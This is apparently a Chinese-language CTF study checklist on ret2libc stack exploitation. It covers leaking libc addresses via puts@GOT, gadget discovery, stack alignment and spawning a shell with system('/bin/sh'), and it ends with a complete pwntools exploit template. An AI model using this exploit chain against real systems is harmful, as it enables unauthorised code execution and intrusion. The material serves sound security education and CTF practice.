# ret2libc 攻擊檢查清單

完整的 ret2libc 攻擊步驟，避免常見錯誤。

## 前置條件檢查

- [ ] NX 已啟用 (Stack 不可執行)
- [ ] 有 buffer overflow 漏洞
- [ ] 有可利用的洩漏點 (puts/printf/write)
- [ ] 可以重複觸發漏洞 (或一次完成)

## 階段 1: 基礎資訊收集

### 1.1 檢查保護機制

```bash
checksec ./vuln
```

**關注項目**:
- NX: Enabled → 需要 ROP
- PIE: Disabled → 固定地址，簡單
- PIE: Enabled → 需要洩漏 binary base
- RELRO: Partial → GOT 可寫
- RELRO: Full → GOT 唯讀，必須 ret2libc

### 1.2 確認 offset

```python
# 使用 cyclic 模式
io = start()
io.sendline(cyclic(500))
io.wait()

core = io.corefile
offset = cyclic_find(core.rsp)  # x64
# offset = cyclic_find(core.eip)  # x86
```

### 1.3 查找可用 gadgets

```bash
# x64 必需 gadgets
ROPgadget --binary vuln | grep "pop rdi ; ret"
ROPgadget --binary vuln | grep "ret$"

# 或查找 libc 中的
ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
```

**必需 gadgets**:
- `pop rdi; ret` (x64 第一參數)
- `ret` (stack alignment)

**可選 gadgets**:
- `pop rsi; pop r15; ret` (如果需要設定第二參數)
- `pop rdx; ret` (如果需要設定第三參數)

## 階段 2: 資訊洩漏 (Leak)

### 2.1 構造洩漏 payload

**目標**: 洩漏 libc 函數的實際地址

```python
# 選擇要洩漏的函數 (常用: puts, printf, read, write)
leak_target = elf.got["puts"]

# 構造 payload
payload = flat({
    offset: [
        pop_rdi,              # gadget: pop rdi; ret
        leak_target,          # 參數: puts@got 地址
        elf.plt["puts"],      # 呼叫 puts(puts@got)
        elf.symbols["main"]   # 返回 main (重新利用)
    ]
})
```

### 2.2 發送並接收洩漏

```python
io = start()
io.sendline(payload)

# 接收洩漏的地址
io.recvuntil(b"expected_prompt")  # 視題目而定
leak = io.recvline().strip()
leak_addr = u64(leak.ljust(8, b'\x00'))

info(f"Leaked puts@libc: {hex(leak_addr)}")
```

### 2.3 驗證洩漏

**檢查項目**:
- [ ] 地址看起來合理 (通常 0x7f... 開頭 for x64)
- [ ] 末 3 位數與 libc offset 對應
- [ ] 可以穩定重現

```python
# 檢查地址範圍
assert leak_addr & 0xfff == 0x809a60 & 0xfff  # 末 12 位應該相同
```

## 階段 3: 計算 libc base

### 3.1 確定 libc 版本

**本地測試**:
```bash
ldd ./vuln
# 顯示: libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

**遠端識別**:
1. 洩漏多個函數 (puts, printf, read)
2. 使用 libc database 搜尋: https://libc.blukat.me/ 或 https://libc.rip/
3. 下載對應 libc

### 3.2 計算 base 地址

```python
# 使用已知 offset
libc_base = leak_addr - libc.symbols["puts"]
info(f"libc base: {hex(libc_base)}")

# 驗證 (末 12 位應該是 0x000)
assert (libc_base & 0xfff) == 0
```

### 3.3 計算目標地址

```python
# system 函數地址
system_addr = libc_base + libc.symbols["system"]
info(f"system: {hex(system_addr)}")

# /bin/sh 字串地址
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
info(f"/bin/sh: {hex(binsh_addr)}")

# one_gadget (可選)
one_gadget_offset = 0x4f322  # 從 one_gadget 工具獲得
one_gadget_addr = libc_base + one_gadget_offset
info(f"one_gadget: {hex(one_gadget_addr)}")
```

## 階段 4: 構造最終 payload

### 4.1 標準 ret2libc (x64)

```python
# 注意: x64 需要 stack alignment
payload = flat({
    offset: [
        ret,            # stack alignment gadget
        pop_rdi,        # pop rdi; ret
        binsh_addr,     # "/bin/sh" 作為參數
        system_addr     # 呼叫 system("/bin/sh")
    ]
})
```

**為什麼需要 `ret` gadget?**
- x64 System V ABI 要求 RSP 在 call 前 16-byte 對齊
- 我們的 buffer overflow 後 RSP 可能是 8-byte 對齊
- 多加一個 `ret` 修正對齊

### 4.2 使用 one_gadget (如果 constraints 滿足)

```python
payload = flat({
    offset: one_gadget_addr
})
```

**檢查 one_gadget constraints**:
```bash
one_gadget libc.so.6

# 輸出範例:
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
```

如果 constraints 無法滿足，回到標準方法。

### 4.3 x86 版本 (不需要 stack alignment)

```python
# x86 使用 stack 傳參數，不需要 pop gadgets
payload = flat({
    offset: [
        system_addr,
        0xdeadbeef,    # fake return address
        binsh_addr      # 第一個參數 (在 stack 上)
    ]
})
```

## 階段 5: 利用與驗證

### 5.1 發送最終 payload

```python
# 重新觸發漏洞 (如果 main 返回後可以再次觸發)
io.sendline(payload)

# 進入互動模式
io.interactive()
```

### 5.2 測試 shell

```python
# 測試命令
io.sendline(b"id")
response = io.recvline()
assert b"uid=" in response

io.sendline(b"cat flag.txt")
flag = io.recvline()
success(f"Flag: {flag.decode()}")
```

## 常見問題與解決

### Problem 1: SIGSEGV 在 system 呼叫時

**原因**: Stack 未對齊

**解決**:
```python
# 在 pop_rdi 前加 ret gadget
payload = flat({
    offset: [
        ret,           # ← 加這個
        pop_rdi,
        binsh_addr,
        system_addr
    ]
})
```

### Problem 2: 找不到 /bin/sh

**解決方案 1**: 在 libc 中搜尋
```python
binsh = libc_base + next(libc.search(b"/bin/sh"))
```

**解決方案 2**: 寫入 .bss 段
```python
bss_addr = elf.bss()

# 第一階段: 寫入 /bin/sh
payload1 = flat({
    offset: [
        pop_rdi, 0,          # stdin
        pop_rsi_r15, bss_addr, 0,
        pop_rdx, 8,
        read_plt,
        main
    ]
})
io.sendline(payload1)
io.send(b"/bin/sh\x00")

# 第二階段: 呼叫 system(bss)
payload2 = flat({
    offset: [
        ret,
        pop_rdi, bss_addr,
        system_addr
    ]
})
```

### Problem 3: 本地可用但遠端失敗

**原因**: libc 版本不同

**解決**: 識別遠端 libc
1. 洩漏多個函數 (puts, printf, read)
2. 記錄末 3 位數 (12 bits)
3. 使用 libc database 搜尋
4. 下載正確的 libc 並重新測試

### Problem 4: 找不到 pop rdi gadget

**解決**:
1. 在 libc 中搜尋: `ROPgadget --binary libc.so.6 | grep "pop rdi"`
2. 使用 ret2csu (通用但複雜)
3. 如果有 PIE，需要先洩漏 binary base

### Problem 5: PIE 啟用

**額外步驟**:
1. 洩漏 binary 地址 (例如洩漏 stack 上的 return address)
2. 計算 binary base
3. 使用相對 offset 計算 gadget 地址

```python
# 洩漏 binary 地址
leak_binary = u64(io.recv(8))
binary_base = leak_binary - 0x1234  # offset to leaked address
pop_rdi = binary_base + 0x1337      # offset to gadget
```

## 完整檢查清單

### 洩漏階段
- [ ] Offset 正確
- [ ] Gadgets 已找到 (pop rdi, ret)
- [ ] 洩漏 payload 構造正確
- [ ] 成功接收洩漏數據
- [ ] 洩漏地址看起來合理
- [ ] libc base 計算正確 (末 12 位是 0x000)

### 利用階段
- [ ] system 地址計算正確
- [ ] /bin/sh 地址找到
- [ ] Stack alignment 處理 (x64)
- [ ] 最終 payload 構造正確
- [ ] 本地測試通過
- [ ] (如果需要) 遠端 libc 識別完成

### 驗證階段
- [ ] 獲得 shell
- [ ] 可以執行命令
- [ ] 獲得 flag

## 模板程式碼

完整模板參考: `00_templates/pwn_rop.py`

```python
#!/usr/bin/env python3
from pwn import *

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = "info"

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Gadgets
pop_rdi = 0x4012a3  # pop rdi; ret
ret = 0x40101a       # ret

# Stage 1: Leak
def leak():
    io = start()
    
    payload = flat({
        offset: [
            pop_rdi,
            elf.got["puts"],
            elf.plt["puts"],
            elf.symbols["main"]
        ]
    })
    
    io.sendline(payload)
    io.recvuntil(b"prompt")
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    
    return io, leak

# Stage 2: Exploit
io, leak_addr = leak()

libc_base = leak_addr - libc.symbols["puts"]
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

info(f"libc base: {hex(libc_base)}")
info(f"system: {hex(system_addr)}")
info(f"/bin/sh: {hex(binsh_addr)}")

payload = flat({
    offset: [
        ret,
        pop_rdi,
        binsh_addr,
        system_addr
    ]
})

io.sendline(payload)
io.interactive()
```

## 參考資料

- [ret2libc 詳解](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc)
- [System V ABI x64](https://wiki.osdev.org/System_V_ABI)
- [libc database](https://libc.blukat.me/)
- [one_gadget](https://github.com/david942j/one_gadget)
